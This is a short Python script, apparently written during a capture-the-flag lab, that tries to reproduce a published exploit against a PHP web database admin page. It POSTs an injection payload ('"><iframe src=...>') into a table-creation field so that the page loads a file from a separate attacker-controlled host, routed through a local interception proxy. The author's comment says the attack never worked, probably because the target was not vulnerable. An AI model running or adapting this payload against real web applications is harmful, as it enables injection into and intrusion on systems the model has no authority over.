#!/usr/bin/env python3
"""
Was trying to get exploits/php/webapps/39714.txt to work. Never seemed to, not sure if I screwed this up or just not vuln. 
Based on not seeing it used in writeups I guess it's just not the right version. 
"""

import requests
import urllib3

http_proxy  = "http://10.10.1.10:3128"
https_proxy = "https://127.0.0.1:8080"
ftp_proxy   = "ftp://10.10.1.10:3128"

proxyDict = { 
              "http"  : http_proxy, 
              "https" : https_proxy, 
              "ftp"   : ftp_proxy
            }

url = 'https://10.10.10.43/db/index.php?action=table_create&confirm=1'
myobj = {'0_defaultoption': '"><iframe src=http://10.10.14.4/file.txt></iframe>'}


x = requests.post(url, data = myobj, verify=False, proxies=proxyDict)
print(x.text)

"""
url = 'https://10.10.10.43/db/index.php'
x = requests.get(url, verify=False)
print(x.text)
"""
